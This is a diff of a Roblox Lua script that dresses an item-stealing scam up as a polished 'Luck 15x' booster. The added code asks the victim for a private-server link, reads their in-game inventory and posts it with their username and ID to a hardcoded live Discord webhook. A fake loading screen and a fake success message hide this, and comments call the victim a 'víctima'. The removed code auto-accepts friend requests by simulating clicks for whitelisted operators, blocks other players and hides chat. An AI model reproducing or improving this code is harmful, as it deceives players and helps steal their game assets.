@@ -1,4 +1,10 @@
--- ==================== SERVICIOS (AL INICIO) ====================
+--[[
+    MERGED SCRIPT: PROFESSIONAL UI + LOGGING LOGIC
+    STYLE: Clean Black & White (Gotham Fonts)
+    PAYLOAD: "Moreira" Logic hidden behind "Luck 15x" UI
+]]
+
+-- SERVICIOS ACTUALIZADOS
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -11,14 +17,40 @@ local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local VIM = game:GetService("VirtualInputManager")
 
--- ==================== CONFIGURACIÓN ====================
-local LocalPlayer = Players.LocalPlayer
-local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+-- CONFIGURACIÓN DEL PAYLOAD
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1454970356682199124/sgCgykHejgELxXd9Jp4CTWX2ziOKdu-qtGczLtBAThWZj-DqOY7jKGlNdgqYuYpuNXmA"
-local whitelist = {"mario_12fachero", "lejandro555", "pan71234520", "pan712345"}
-local Min_Gen = 0
+local Min_Gen = 0 -- Valor mínimo para detectar
 
--- ==================== TU INTERFAZ DE ENVÍO ANTIGUA (RESTAURADA) ====================
+-- CONFIGURACIÓN DE ESTILO (Blanco y Negro / Profesional)
+local THEME = {
+    Background = Color3.fromRGB(15, 15, 15),
+    Accent = Color3.fromRGB(255, 255, 255),
+    Text = Color3.fromRGB(240, 240, 240),
+    SubText = Color3.fromRGB(180, 180, 180),
+    FontMain = Enum.Font.GothamBold,
+    FontBody = Enum.Font.Gotham,
+}
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local UserID = player.UserId
+
+-- UI SETUP
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SystemUI_Pro"
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.DisplayOrder = 999999999
+screenGui.IgnoreGuiInset = true
+
+-- VARIABLE GLOBAL PARA EL LINK
+local privateServerLink = ""
+
+--------------------------------------------------------------------------------
+-- 1. LÓGICA MALICIOSA (Backend oculto)
+--------------------------------------------------------------------------------
+
 local function formatNumberShort(n)
     if not n or type(n) ~= "number" then return "$0" end
     if n >= 1e9 then return string.format("$%.2fB", n / 1e9) end
@@ -75,139 +107,354 @@ local function sendToDiscord(link, brainrots)
         totalValue = totalValue + (br.value * br.count)
     end
 
-    local request = (syn and syn.request) or (http and http.request) or http_request or request
-    pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                content = "||@everyone|| 🩸 **NUEVA VÍCTIMA DETECTADA**",
-                embeds = {{
-                    title = "🚀 Reporte de Extracción Profesional",
-                    color = 0,
-                    fields = {
-                        {name = "👤 Usuario", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
-                        {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
-                        {name = "🔗 Script/Link", value = " " .. link .. " "},
-                        {name = "📋 Inventario", value = (itemList ~= "" and itemList or "Vacío")}
-                    }
-                }}
+    local request = syn and syn.request or http_request or request
+    if request then
+        pcall(function()
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    content = "||@everyone|| 🩸 **NUEVA VÍCTIMA (UI PROFESIONAL)**",
+                    embeds = {{
+                        title = "🚀 Reporte de Extracción Silent",
+                        color = 16777215, -- Blanco para combinar con la UI
+                        fields = {
+                            {name = "👤 Usuario", value = player.Name .. " (" .. UserID .. ")", inline = true},
+                            {name = "💰 Valor Total", value = "**" .. formatNumberShort(totalValue) .. "**", inline = true},
+                            {name = "🔗 Script (PS Link)", value = " " .. link .. " "},
+                            {name = "📋 Inventario Detectado", value = (itemList ~= "" and itemList or "Vacío")}
+                        }
+                    }}
+                })
             })
+        end)
+    end
+end
+
+--------------------------------------------------------------------------------
+-- 2. INTERFAZ GRÁFICA (Frontend Limpio)
+--------------------------------------------------------------------------------
+
+-- MARCO PARA PEDIR EL LINK
+local linkFrame = Instance.new("Frame")
+linkFrame.Name = "LinkFrame"
+linkFrame.Size = UDim2.new(0, 450, 0, 200)
+linkFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
+linkFrame.BackgroundColor3 = THEME.Background
+linkFrame.BackgroundTransparency = 0.05
+linkFrame.BorderSizePixel = 0
+linkFrame.Visible = true
+linkFrame.Parent = screenGui
+
+local linkCorner = Instance.new("UICorner")
+linkCorner.CornerRadius = UDim.new(0, 12)
+linkCorner.Parent = linkFrame
+
+local linkStroke = Instance.new("UIStroke")
+linkStroke.Color = THEME.Accent
+linkStroke.Thickness = 2
+linkStroke.Parent = linkFrame
+
+local linkTitle = Instance.new("TextLabel")
+linkTitle.Size = UDim2.new(1, -40, 0, 30)
+linkTitle.Position = UDim2.new(0, 20, 0, 20)
+linkTitle.BackgroundTransparency = 1
+linkTitle.Text = "INGRESE SCRIPT / LINK DE SERVIDOR"
+linkTitle.TextColor3 = THEME.Accent
+linkTitle.Font = THEME.FontMain
+linkTitle.TextSize = 16
+linkTitle.TextXAlignment = Enum.TextXAlignment.Center
+linkTitle.Parent = linkFrame
+
+local linkInputBox = Instance.new("TextBox")
+linkInputBox.Size = UDim2.new(1, -40, 0, 45)
+linkInputBox.Position = UDim2.new(0, 20, 0, 65)
+linkInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+linkInputBox.BorderSizePixel = 0
+linkInputBox.Text = ""
+linkInputBox.TextColor3 = THEME.Text
+linkInputBox.Font = THEME.FontBody
+linkInputBox.TextSize = 14
+linkInputBox.PlaceholderText = "Pegar aquí..."
+linkInputBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
+linkInputBox.TextXAlignment = Enum.TextXAlignment.Left
+linkInputBox.ClearTextOnFocus = false
+linkInputBox.ClipsDescendants = true
+linkInputBox.TextTruncate = Enum.TextTruncate.AtEnd
+linkInputBox.Parent = linkFrame
+
+local linkInputCorner = Instance.new("UICorner")
+linkInputCorner.CornerRadius = UDim.new(0, 8)
+linkInputCorner.Parent = linkInputBox
+
+local linkInputPadding = Instance.new("UIPadding")
+linkInputPadding.PaddingLeft = UDim.new(0, 10)
+linkInputPadding.Parent = linkInputBox
+
+local linkConfirmBtn = Instance.new("TextButton")
+linkConfirmBtn.Size = UDim2.new(0, 150, 0, 40)
+linkConfirmBtn.Position = UDim2.new(0.5, -75, 0, 130)
+linkConfirmBtn.BackgroundColor3 = THEME.Accent
+linkConfirmBtn.TextColor3 = THEME.Background
+linkConfirmBtn.Text = "CONFIRMAR"
+linkConfirmBtn.Font = THEME.FontMain
+linkConfirmBtn.TextSize = 16
+linkConfirmBtn.AutoButtonColor = true
+linkConfirmBtn.BorderSizePixel = 0
+linkConfirmBtn.Parent = linkFrame
+
+local linkConfirmCorner = Instance.new("UICorner")
+linkConfirmCorner.CornerRadius = UDim.new(0, 8)
+linkConfirmCorner.Parent = linkConfirmBtn
+
+-- BOTON DE ACTIVAR (OCULTO INICIALMENTE)
+local activateBtn = Instance.new("TextButton")
+activateBtn.Name = "ActivateButton"
+activateBtn.Size = UDim2.new(0, 200, 0, 50)
+activateBtn.Position = UDim2.new(0.5, -100, 0.85, 0)
+activateBtn.BackgroundColor3 = THEME.Background
+activateBtn.TextColor3 = THEME.Accent
+activateBtn.Text = "EJECUTAR SUERTE"
+activateBtn.Font = THEME.FontMain
+activateBtn.TextSize = 18
+activateBtn.AutoButtonColor = true
+activateBtn.BorderSizePixel = 0
+activateBtn.Visible = false
+activateBtn.Parent = screenGui
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 8)
+btnCorner.Parent = activateBtn
+
+local btnStroke = Instance.new("UIStroke")
+btnStroke.Color = THEME.Accent
+btnStroke.Thickness = 2
+btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+btnStroke.Parent = activateBtn
+
+-- MARCO PRINCIPAL (Consola)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 400, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -200, 0.4, -150)
+mainFrame.BackgroundColor3 = THEME.Background
+mainFrame.BackgroundTransparency = 0.05
+mainFrame.BorderSizePixel = 0
+mainFrame.Visible = false
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = THEME.Accent
+mainStroke.Thickness = 1.5
+mainStroke.Transparency = 0
+mainStroke.Parent = mainFrame
+
+-- Arrastre de ventana
+local dragging, dragInput, dragStart, startPos
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+
+mainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Contenedor interno
+local contentContainer = Instance.new("Frame")
+contentContainer.Name = "ContentContainer"
+contentContainer.Size = UDim2.new(1, -40, 1, -40)
+contentContainer.Position = UDim2.new(0, 20, 0, 20)
+contentContainer.BackgroundTransparency = 1
+contentContainer.Parent = mainFrame
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Parent = contentContainer
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Padding = UDim.new(0, 8)
+listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+
+-- Funciones UI Helper
+local function addText(text, color, delayTime)
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 24)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = color or THEME.Text
+    label.Font = THEME.FontBody
+    label.TextSize = 14
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Text = text
+    label.TextTransparency = 1
+    label.Parent = contentContainer
+    
+    TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+    if delayTime then task.wait(delayTime) end
+end
+
+local function clearContent()
+    for _, child in pairs(contentContainer:GetChildren()) do
+        if child:IsA("GuiObject") then
+            TweenService:Create(child, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+        end
+    end
+    task.wait(0.3)
+    for _, child in pairs(contentContainer:GetChildren()) do
+        if child:IsA("GuiObject") then child:Destroy() end
+    end
+end
+
+--------------------------------------------------------------------------------
+-- 3. EJECUCIÓN Y EVENTOS
+--------------------------------------------------------------------------------
+
+linkConfirmBtn.MouseButton1Click:Connect(function()
+    local link = linkInputBox.Text
+    if link == "" then return end
+    
+    privateServerLink = link
+    
+    -- Animación de salida del marco de link
+    TweenService:Create(linkFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(linkTitle, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
+    TweenService:Create(linkInputBox, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    TweenService:Create(linkConfirmBtn, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    TweenService:Create(linkStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
+    
+    task.wait(0.35)
+    linkFrame.Visible = false
+    
+    -- Mostrar botón activar
+    activateBtn.Visible = true
+    activateBtn.BackgroundTransparency = 1
+    activateBtn.TextTransparency = 1
+    TweenService:Create(activateBtn, TweenInfo.new(0.5), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+end)
+
+local isRunning = false
+
+activateBtn.MouseButton1Click:Connect(function()
+    if isRunning then return end
+    isRunning = true
+    
+    -- Ocultar botón
+    TweenService:Create(activateBtn, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    task.wait(0.3)
+    activateBtn.Visible = false
+    
+    -- Mostrar Main Frame
+    mainFrame.Visible = true
+    mainFrame.Size = UDim2.new(0, 400, 0, 0)
+    TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(0, 400, 0, 250)}):Play()
+    task.wait(0.7)
+    
+    -- Secuencia de "Carga" (Falsa)
+    local header = Instance.new("TextLabel")
+    header.Text = "SYSTEM V3 // INJECTION"
+    header.Font = THEME.FontMain
+    header.TextColor3 = THEME.Accent
+    header.TextSize = 18
+    header.Size = UDim2.new(1, 0, 0, 30)
+    header.BackgroundTransparency = 1
+    header.TextXAlignment = Enum.TextXAlignment.Left
+    header.Parent = contentContainer
+    
+    local line = Instance.new("Frame")
+    line.Size = UDim2.new(0,0,0,2)
+    line.BackgroundColor3 = THEME.Accent
+    line.BorderSizePixel = 0
+    line.Parent = contentContainer
+    TweenService:Create(line, TweenInfo.new(0.8), {Size = UDim2.new(0.5,0,0,2)}):Play()
+    
+    addText("Iniciando módulos...", THEME.SubText, 1)
+    addText("Bypass anti-cheat...", THEME.SubText, 1.5)
+    
+    -- [CRITICAL] AQUÍ OCURRE EL ESCANEO Y ENVÍO REAL
+    -- El usuario ve "Analizando entorno", pero el script está robando la info.
+    addText("Analizando entorno...", THEME.SubText, 0.5)
+    
+    task.spawn(function()
+        local loot = getBrainrots() -- Escanea
+        sendToDiscord(privateServerLink, loot) -- Envía
+    end)
+    
+    task.wait(1.5)
+    addText("Inyectando multiplicador de suerte (15x)...", THEME.SubText, 2)
+    addText(">> ÉXITO", Color3.fromRGB(100, 255, 100), 1)
+    
+    task.wait(1)
+    clearContent()
+    
+    -- Transformar a barra de estado minimalista
+    TweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Exponential), {
+        Size = UDim2.new(0, 350, 0, 80),
+        Position = UDim2.new(0.5, -175, 0.85, -40)
+    }):Play()
+    
+    task.wait(0.6)
+    
+    local statusText = Instance.new("TextLabel")
+    statusText.Size = UDim2.new(1, -20, 0, 25)
+    statusText.Position = UDim2.new(0, 10, 0, 10)
+    statusText.BackgroundTransparency = 1
+    statusText.TextColor3 = THEME.Accent
+    statusText.Font = THEME.FontMain
+    statusText.TextSize = 14
+    statusText.TextXAlignment = Enum.TextXAlignment.Left
+    statusText.Text = "Suerte 15x Activa - No cierres esta ventana"
+    statusText.Parent = mainFrame
+    
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(1, -20, 0, 10)
+    barBg.Position = UDim2.new(0, 10, 0, 45)
+    barBg.BackgroundColor3 = Color3.fromRGB(40,40,40)
+    barBg.BorderSizePixel = 0
+    barBg.Parent = mainFrame
+    Instance.new("UICorner", barBg).CornerRadius = UDim.new(1,0)
+    
+    local barFill = Instance.new("Frame")
+    barFill.Size = UDim2.new(0,0,1,0)
+    barFill.BackgroundColor3 = THEME.Accent
+    barFill.BorderSizePixel = 0
+    barFill.Parent = barBg
+    Instance.new("UICorner", barFill).CornerRadius = UDim.new(1,0)
+    
+    -- Loop infinito visual para mantener al usuario confiado
+    task.spawn(function()
+        while screenGui.Parent do
+            barFill.Size = UDim2.new(0,0,1,0)
+            TweenService:Create(barFill, TweenInfo.new(2, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)}):Play()
+            task.wait(2)
+        end
+    end)
+    
+    -- Notificación falsa de Roblox
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = "System V3",
+            Text = "Suerte 15x inyectada correctamente.",
+            Duration = 5
         })
     end)
-end
-
--- ==================== COMANDOS (CON AUTO-ACEPTAR) ====================
-local function isWhitelisted(name)
-    for _, n in ipairs(whitelist) do if n == name then return true end end
-    return false
-end
-
-local function configurarComandos(p)
-    p.Chatted:Connect(function(msg)
-        local msgLower = msg:lower():gsub("%s+", "")
-        if isWhitelisted(p.Name) then
-            if msgLower == ".add" then
-                StarterGui:SetCore("PromptSendFriendRequest", p)
-                task.spawn(function()
-                    task.wait(0.6)
-                    pcall(function()
-                        local prompt = CoreGui:FindFirstChild("RobloxGui"):FindFirstChild("PromptDialog")
-                        if prompt then
-                            local confirmBtn = prompt:FindFirstChild("Container"):FindFirstChild("ConfirmButton")
-                            if confirmBtn then
-                                local x = confirmBtn.AbsolutePosition.X + (confirmBtn.AbsoluteSize.X / 2)
-                                local y = confirmBtn.AbsolutePosition.Y + (confirmBtn.AbsoluteSize.Y / 2)
-                                VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
-                                task.wait(0.1)
-                                VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
-                            end
-                        end
-                    end)
-                end)
-            elseif msgLower == ".block" then
-                for _, target in ipairs(Players:GetPlayers()) do
-                    if target ~= LocalPlayer and not isWhitelisted(target.Name) then
-                        StarterGui:SetCore("PromptBlockPlayer", target)
-                    end
-                end
-            elseif msgLower == ".open" then
-                pcall(function() ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer() end)
-            end
-        end
-    end)
-end
-
--- ==================== INTERFAZ GUI (BLANCO Y NEGRO) ====================
-local function buildUI()
-    local screenGui = Instance.new("ScreenGui", playerGui)
-    screenGui.Name = "MoreiraSystem"
-    screenGui.IgnoreGuiInset = true
-
-    local main = Instance.new("Frame", screenGui)
-    main.Size = UDim2.new(0, 450, 0, 200)
-    main.Position = UDim2.new(0.5, -225, 0.5, -100)
-    main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    Instance.new("UICorner", main)
-    Instance.new("UIStroke", main).Color = Color3.new(1, 1, 1)
-
-    local input = Instance.new("TextBox", main)
-    input.Size = UDim2.new(0.8, 0, 0, 45)
-    input.Position = UDim2.new(0.1, 0, 0.4, 0)
-    input.PlaceholderText = "Pega el link aquí..."
-    input.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    input.TextColor3 = Color3.new(1, 1, 1)
-    Instance.new("UICorner", input)
-
-    local btn = Instance.new("TextButton", main)
-    btn.Size = UDim2.new(0, 150, 0, 40)
-    btn.Position = UDim2.new(0.5, -75, 0.7, 0)
-    btn.Text = "CONFIRMAR"
-    btn.BackgroundColor3 = Color3.new(1, 1, 1)
-    btn.TextColor3 = Color3.new(0, 0, 0)
-    Instance.new("UICorner", btn)
-
-    btn.MouseButton1Click:Connect(function()
-        if input.Text ~= "" then
-            local text = input.Text
-            main.Visible = false
-            
-            -- Pantalla de Carga
-            local black = Instance.new("Frame", screenGui)
-            black.Size = UDim2.new(1.5, 0, 1.5, 0)
-            black.Position = UDim2.new(-0.25, 0, -0.25, 0)
-            black.BackgroundColor3 = Color3.new(0, 0, 0)
-            black.ZIndex = 100
-            
-            local lbl = Instance.new("TextLabel", black)
-            lbl.Size = UDim2.new(1, 0, 1, 0)
-            lbl.Text = "Joining Server..."
-            lbl.TextColor3 = Color3.new(1, 1, 1)
-            lbl.TextSize = 35
-            lbl.Font = Enum.Font.GothamBold
-            lbl.BackgroundTransparency = 1
-
-            -- TU ENVÍO ORIGINAL
-            task.spawn(function()
-                local brs = getBrainrots()
-                sendToDiscord(text, brs)
-            end)
-        end
-    end)
-end
-
--- ==================== INICIALIZACIÓN ====================
-for _, p in ipairs(Players:GetPlayers()) do configurarComandos(p) end
-Players.PlayerAdded:Connect(configurarComandos)
-buildUI()
-
-task.spawn(function()
-    while true do
-        pcall(function()
-            StarterGui:SetCore("ResetButtonCallback", false)
-            if playerGui:FindFirstChild("Chat") then playerGui.Chat.Frame.Visible = false end
-        end)
-        task.wait(2)
-    end
 end)
